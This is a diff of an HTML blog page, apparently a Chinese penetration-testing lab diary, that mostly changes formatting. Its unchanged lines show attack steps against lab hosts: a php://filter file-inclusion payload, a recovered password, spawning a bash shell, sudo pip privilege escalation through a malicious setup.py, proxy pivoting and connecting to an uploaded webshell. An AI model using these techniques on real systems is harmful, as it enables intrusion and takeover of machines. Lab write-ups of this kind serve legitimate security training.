@@ -189,7 +189,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ffa2c4">
+                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #03a9f4">
                     渗透测试
                 </a>
             </span>
@@ -208,7 +208,7 @@
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/2.png" alt="img"></p>
 <p>不能rce但是可以<strong>filter文件包含</strong>，<code>dirb http://192.168.1.7/?lang=</code>（这里http和https扫出来的东西是不一样的）扫出来<strong>index</strong></p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/3.png" alt="img"></p>
-<pre><code class="Plain">http://192.168.1.7/?lang=php://filter/read/convert.base64-encode/resource=index
+<pre><code>http://192.168.1.7/?lang=php://filter/read/convert.base64-encode/resource=index
 </code></pre>
 <p>base64解开拿到passwd<code>Niamey4Ever227!!!</code></p>
 <pre><code class="PHP">&lt;?php
@@ -229,8 +229,7 @@ include($_GET[&#39;lang&#39;].&quot;.php&quot;);
 pty.spawn(&quot;/bin/bash&quot;)
 </code></pre>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/7.png" alt="img"></p>
-<pre><code>cat /etc/passwd`发现新用户`devops
-</code></pre>
+<p><code>cat /etc/passwd</code>发现新用户<code>devops</code></p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/8.png" alt="img"></p>
 <p>跟进去发现<code>flag2.txt</code>无法读取</p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/9.png" alt="img"></p>
@@ -257,8 +256,7 @@ p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/14.png" alt="img"></p>
 <p>接着尝试能否将devops用户提权<code>root</code>，<code>sudo -l</code>查</p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/15.png" alt="img"></p>
-<pre><code>pip`命令是`NOPASSWD`的，可以使用`fakepip`https://github.com/0x00-0x00/FakePip打，伪造`setup.py
-</code></pre>
+<p><code>pip</code>命令是<code>NOPASSWD</code>的，可以使用<code>fakepip</code><a target="_blank" rel="noopener" href="https://github.com/0x00-0x00/FakePip%E6%89%93%EF%BC%8C%E4%BC%AA%E9%80%A0%60setup.py%60">https://github.com/0x00-0x00/FakePip打，伪造`setup.py`</a></p>
 <p>另外如果需要使用别的命令提权可以来这儿找找<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p>
 <pre><code class="Python">from setuptools import setup
 from setuptools.command.install import install
@@ -296,9 +294,7 @@ setup(name=&#39;FakePip&#39;,
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/19.png" alt="img"></p>
 <p>连接服务端</p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/20.png" alt="img"></p>
-<p>成功连接后设置<code>proxychains</code>配置文件，新增一条<code>socks5</code>记录</p>
-<pre><code>vim /etc/proxychains.conf
-</code></pre>
+<p>成功连接后设置<code>proxychains</code>配置文件，新增一条<code>socks5</code>记录<code>vim /etc/proxychains.conf</code></p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/21.png" alt="img"></p>
 <p>找个scan.py开扫<code>proxychains python scan.py 192.168.1.1 192.168.1.10 -t 20</code>（要加proxychains走代理）</p>
 <pre><code class="Python">!/usr/bin/env python
@@ -556,8 +552,8 @@ elseif ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])`，于是我们直接伪造`HT
 <pre><code>case=language&amp;act=edit&amp;table=orders&amp;admin_dir=admin&amp;site=default&amp;ishtml=1
 </code></pre>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/28.png" alt="img"></p>
-<p>然后很抽象，本来写进去的马实际上叫<code>administrator233.php</code>。。。</p>
-<p><code>AntSword</code>设置<code>socks5</code>然后连上马</p>
+<p>然后很抽象，本来写进去的马实际上叫<code>administrator233.php</code></p>
+<p><code>AntSword</code>设置<code>socks5</code>连上马</p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/29.png" alt="img"></p>
 <p>成功上线</p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/30.png" alt="img"></p>
